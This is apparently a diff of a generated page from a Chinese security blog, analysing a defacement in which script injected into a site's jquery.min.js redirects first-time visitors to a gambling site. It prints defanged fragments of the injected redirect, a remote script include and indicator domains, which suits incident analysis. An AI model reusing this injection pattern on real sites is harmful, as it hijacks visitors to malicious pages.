@@ -10,18 +10,18 @@
     <title>页面篡改分析-首次会话跳转菠菜页面篡改分析 - x7peeps</title>
     <link href="/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E9%A6%96%E6%AC%A1%E4%BC%9A%E8%AF%9D%E8%B7%B3%E8%BD%AC%E8%8F%A0%E8%8F%9C%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/index.xml" rel="alternate" type="application/rss+xml" title="页面篡改分析-首次会话跳转菠菜页面篡改分析 - x7peeps"><link rel="icon" href="/images/head.png" type="image/png">
     <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
-    <link href="/css/fontawesome-all.min.css?1690855899" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1690855899" rel="stylesheet"></noscript>
-    <link href="/css/nucleus.css?1690855899" rel="stylesheet">
-    <link href="/css/auto-complete.css?1690855899" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1690855899" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar.min.css?1690855899" rel="stylesheet">
-    <link href="/css/fonts.css?1690855899" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1690855899" rel="stylesheet"></noscript>
-    <link href="/css/theme.css?1690855899" rel="stylesheet">
-    <link href="/css/theme-auto.css?1690855899" rel="stylesheet" id="variant-style">
-    <link href="/css/variant.css?1690855899" rel="stylesheet">
-    <link href="/css/print.css?1690855899" rel="stylesheet" media="print">
-    <link href="/css/ie.css?1690855899" rel="stylesheet">
-    <script src="/js/url.js?1690855899"></script>
-    <script src="/js/variant.js?1690855899"></script>
+    <link href="/css/fontawesome-all.min.css?1690856273" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1690856273" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1690856273" rel="stylesheet">
+    <link href="/css/auto-complete.css?1690856273" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1690856273" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1690856273" rel="stylesheet">
+    <link href="/css/fonts.css?1690856273" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1690856273" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1690856273" rel="stylesheet">
+    <link href="/css/theme-auto.css?1690856273" rel="stylesheet" id="variant-style">
+    <link href="/css/variant.css?1690856273" rel="stylesheet">
+    <link href="/css/print.css?1690856273" rel="stylesheet" media="print">
+    <link href="/css/ie.css?1690856273" rel="stylesheet">
+    <script src="/js/url.js?1690856273"></script>
+    <script src="/js/variant.js?1690856273"></script>
     <script>
       // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
       // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
@@ -96,10 +96,10 @@
 <h3 id="前言">前言</h3>
 <p>在某会曾经出现过一次基于运营商的某度广告推广导致手机平台恶意跳转现象，本次样本发现了一处类似的现象，对其分析发现通过脚本实现的首次跳转功能。下面是详细过程。
 
-<a href="#image-fa47f67e646ab9ff982f5393bb3363e6" class="lightbox-link">
+<a href="#image-6abdb2e37aab09b1b2c9bf5bc2523eab" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/20190920102627.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-fa47f67e646ab9ff982f5393bb3363e6">
+<a href="javascript:history.back();" class="lightbox" id="image-6abdb2e37aab09b1b2c9bf5bc2523eab">
 <img src="http://blogimage.xtpeeps.cn/20190920102627.png-A" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <p>可以看到，整个跳转流程。现在需要做的就是分析其中原理。
@@ -111,10 +111,10 @@ https://tz01321[.]com Referer	https://sdfhu1[.]com/248486.html
 https://sdfhu1[.]com/248486.html Referer	弱点网站</code></pre></div><h3 id="定位篡改点">定位篡改点</h3>
 <p>现在就是确定具体被篡改的位置了：
 
-<a href="#image-8c2778ec70aec9c05ccc8f4c95fce170" class="lightbox-link">
+<a href="#image-7e5781bfb1321983bb04a711789e5783" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/1568965401188_566544C4-D462-46c8-A898-6DFD095D3548.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-8c2778ec70aec9c05ccc8f4c95fce170">
+<a href="javascript:history.back();" class="lightbox" id="image-7e5781bfb1321983bb04a711789e5783">
 <img src="http://blogimage.xtpeeps.cn/1568965401188_566544C4-D462-46c8-A898-6DFD095D3548.png-A" alt="" class="lightbox-image" loading="lazy">
 </a>
 可以看到这个/statics/js/jquery.min.js文件内被插入下面这段代码，并且根据逻辑可以知道，在用户第一次访问的时候触发此脚本，客户跳转至https[:]//sdfhu1[.]com/248486.html ，同时添加设置cookie,打标非第一次访问，这样下次访问就不会触发此跳转。</p>
@@ -129,26 +129,26 @@ https://sdfhu1[.]com/248486.html Referer	弱点网站</code></pre></div><h3 id="
 </span></span><span style="display:flex;"><span>         <span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;https[:]//sdfhu1[.]com/248486.html&#39;</span>
 </span></span><span style="display:flex;"><span>     }</span></span></code></pre></div><p>下面为该脚本在源代码的位置：
 
-<a href="#image-8eead15199dc5d223222388ffe61e7bf" class="lightbox-link">
+<a href="#image-de91d03f687c47bce3bf1d37e89141b3" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/20190920162947.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-8eead15199dc5d223222388ffe61e7bf">
+<a href="javascript:history.back();" class="lightbox" id="image-de91d03f687c47bce3bf1d37e89141b3">
 <img src="http://blogimage.xtpeeps.cn/20190920162947.png-A" alt="" class="lightbox-image" loading="lazy">
 </a>
 除了上面的脚本，我们在/statics/js/dialog.js中发现了这样一段，开始怀疑但最后证明仍然为篡改菠菜网站相关：
 
-<a href="#image-7a98fbac129317fb890c8c2713dd8b20" class="lightbox-link">
+<a href="#image-e0ff8d1dd1eccf5c3518e74d7309d403" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/20190920163921.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-7a98fbac129317fb890c8c2713dd8b20">
+<a href="javascript:history.back();" class="lightbox" id="image-e0ff8d1dd1eccf5c3518e74d7309d403">
 <img src="http://blogimage.xtpeeps.cn/20190920163921.png-A" alt="" class="lightbox-image" loading="lazy">
 </a>
 其中引入了这样一段，而直接访问该脚本不显示任何内容，因此暂时未知其功能：</p>
 <div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">include</span>(<span style="color:#e6db74">&#34;http[:]//www[.]oydaiyun[.]com/images/js.js&#34;</span>);</span></span></code></pre></div><div class="wrap-code highlight"><pre tabindex="0"><code>oydaiyun[.]com  referer http[:]//www[.]oydaiyun[.]com/images/js.js </code></pre></div><p>
-<a href="#image-b22ab73779dcabcf189534f3cd01f075" class="lightbox-link">
+<a href="#image-c613666bc86922e44d986430689018e9" class="lightbox-link">
 <img src="http://blogimage.xtpeeps.cn/20190920173817.png-A" alt="" style="height: auto; width: auto;" loading="lazy">
 </a>
-<a href="javascript:history.back();" class="lightbox" id="image-b22ab73779dcabcf189534f3cd01f075">
+<a href="javascript:history.back();" class="lightbox" id="image-c613666bc86922e44d986430689018e9">
 <img src="http://blogimage.xtpeeps.cn/20190920173817.png-A" alt="" class="lightbox-image" loading="lazy">
 </a></p>
 <h3 id="分析过程">分析过程</h3>
@@ -184,12 +184,12 @@ tz01321[.]com</p>
         <script>
           var contentLangs=['en'];
         </script>
-        <script src="/js/auto-complete.js?1690855900" defer></script>
-        <script src="/js/lunr/lunr.min.js?1690855900" defer></script>
-        <script src="/js/lunr/lunr.stemmer.support.min.js?1690855900" defer></script>
-        <script src="/js/lunr/lunr.multi.min.js?1690855900" defer></script>
-        <script src="/js/lunr/lunr.en.min.js?1690855900" defer></script>
-        <script src="/js/search.js?1690855900" defer></script>
+        <script src="/js/auto-complete.js?1690856274" defer></script>
+        <script src="/js/lunr/lunr.min.js?1690856274" defer></script>
+        <script src="/js/lunr/lunr.stemmer.support.min.js?1690856274" defer></script>
+        <script src="/js/lunr/lunr.multi.min.js?1690856274" defer></script>
+        <script src="/js/lunr/lunr.en.min.js?1690856274" defer></script>
+        <script src="/js/search.js?1690856274" defer></script>
       </div>
       <div id="content-wrapper" class="highlightable">
         <ul class="topics enlarge morespace collapsible-menu">
@@ -287,7 +287,7 @@ tz01321[.]com</p>
           <li data-nav-id="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/index.html" class=""><input type="checkbox" id="section-be882d7838b29bb55035a73606bd5fad" aria-controls="subsections-be882d7838b29bb55035a73606bd5fad"><label for="section-be882d7838b29bb55035a73606bd5fad"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu 操作系统</span></label><a class="padding" href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/index.html">操作系统<i class="fas fa-check read-icon"></i></a><ul id="subsections-be882d7838b29bb55035a73606bd5fad" class="morespace collapsible-menu">
           <li data-nav-id="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/index.html" class=""><input type="checkbox" id="section-0a43e999527d8431e07a6c83274453d0" aria-controls="subsections-0a43e999527d8431e07a6c83274453d0"><label for="section-0a43e999527d8431e07a6c83274453d0"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu windows</span></label><a class="padding" href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/index.html">windows<i class="fas fa-check read-icon"></i></a><ul id="subsections-0a43e999527d8431e07a6c83274453d0" class="morespace collapsible-menu">
           <li data-nav-id="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Powershell/index.html" class=""><input type="checkbox" id="section-4b5256e8689ed2826632ee3c944d042e" aria-controls="subsections-4b5256e8689ed2826632ee3c944d042e"><label for="section-4b5256e8689ed2826632ee3c944d042e"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu Powershell</span></label><a class="padding" href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Powershell/index.html">Powershell<i class="fas fa-check read-icon"></i></a><ul id="subsections-4b5256e8689ed2826632ee3c944d042e" class="morespace collapsible-menu">
-          <li data-nav-id="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Powershell/ms-gpsbwindow%E6%A0%B8%E5%BF%83%E5%8D%8F%E8%AE%AE-%E5%AE%89%E5%85%A8%E6%89%A9%E5%B1%95%E5%8D%8F%E8%AE%AE/index.html" class=""><a class="padding" href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Powershell/ms-gpsbwindow%E6%A0%B8%E5%BF%83%E5%8D%8F%E8%AE%AE-%E5%AE%89%E5%85%A8%E6%89%A9%E5%B1%95%E5%8D%8F%E8%AE%AE/index.html">[MS-GPSB]Window核心协议-安全扩展协议<i class="fas fa-check read-icon"></i></a></li></ul></li>
+          <li data-nav-id="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Powershell/ms-gpsb_window%E6%A0%B8%E5%BF%83%E5%8D%8F%E8%AE%AE-%E5%AE%89%E5%85%A8%E6%89%A9%E5%B1%95%E5%8D%8F%E8%AE%AE/index.html" class=""><a class="padding" href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Powershell/ms-gpsb_window%E6%A0%B8%E5%BF%83%E5%8D%8F%E8%AE%AE-%E5%AE%89%E5%85%A8%E6%89%A9%E5%B1%95%E5%8D%8F%E8%AE%AE/index.html">[MS-GPSB]Window核心协议-安全扩展协议<i class="fas fa-check read-icon"></i></a></li></ul></li>
           <li data-nav-id="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/index.html" class=""><input type="checkbox" id="section-1dcf0d8ab382f88a0dec20aa11c7a8c6" aria-controls="subsections-1dcf0d8ab382f88a0dec20aa11c7a8c6"><label for="section-1dcf0d8ab382f88a0dec20aa11c7a8c6"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu 组策略</span></label><a class="padding" href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/index.html">组策略<i class="fas fa-check read-icon"></i></a><ul id="subsections-1dcf0d8ab382f88a0dec20aa11c7a8c6" class="morespace collapsible-menu">
           <li data-nav-id="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/sid%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6/index.html" class=""><a class="padding" href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/%E7%BB%84%E7%AD%96%E7%95%A5/sid%E5%AE%89%E5%85%A8%E6%A0%87%E8%AF%86%E7%AC%A6/index.html">SID安全标识符<i class="fas fa-check read-icon"></i></a></li></ul></li></ul></li></ul></li>
           <li data-nav-id="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html" class=""><input type="checkbox" id="section-6d101735907668b9565f2b24f0ce6829" aria-controls="subsections-6d101735907668b9565f2b24f0ce6829"><label for="section-6d101735907668b9565f2b24f0ce6829"><i class="fas fa-chevron-down"></i><i class="fas fa-chevron-right"></i><span class="a11y-only">Submenu 渗透测试</span></label><a class="padding" href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">渗透测试<i class="fas fa-check read-icon"></i></a><ul id="subsections-6d101735907668b9565f2b24f0ce6829" class="morespace collapsible-menu">
@@ -381,8 +381,8 @@ tz01321[.]com</p>
         </div>
       </div>
     </aside>
-    <script src="/js/clipboard.min.js?1690855900" defer></script>
-    <script src="/js/perfect-scrollbar.min.js?1690855900" defer></script>
+    <script src="/js/clipboard.min.js?1690856274" defer></script>
+    <script src="/js/perfect-scrollbar.min.js?1690856274" defer></script>
     <script>
       function useMathJax( config ){
         if( !Object.assign ){
@@ -412,15 +412,15 @@ tz01321[.]com</p>
       useMathJax( JSON.parse("{}") );
     </script>
     <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-    <script src="/js/d3/d3-color.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-dispatch.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-drag.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-ease.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-interpolate.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-selection.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-timer.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-transition.min.js?1690855900" defer></script>
-    <script src="/js/d3/d3-zoom.min.js?1690855900" defer></script>
+    <script src="/js/d3/d3-color.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-dispatch.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-drag.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-ease.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-interpolate.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-selection.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-timer.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-transition.min.js?1690856274" defer></script>
+    <script src="/js/d3/d3-zoom.min.js?1690856274" defer></script>
     <script src="https://unpkg.com/mermaid/dist/mermaid.min.js" defer></script>
     <script>
       window.themeUseMermaid = JSON.parse("{ \"theme\": \"default\" }");
@@ -429,8 +429,8 @@ tz01321[.]com</p>
     <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-bundle.js" defer></script>
     <script src="https://unpkg.com/swagger-ui-dist/swagger-ui-standalone-preset.js" defer></script>
     <script>
-      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1690855900  };
+      window.themeUseOpenapi = { css: "https://unpkg.com/swagger-ui-dist/swagger-ui.css", assetsBuster:  1690856274  };
     </script>
-    <script src="/js/theme.js?1690855900" defer></script>
+    <script src="/js/theme.js?1690856274" defer></script>
   </body>
 </html>
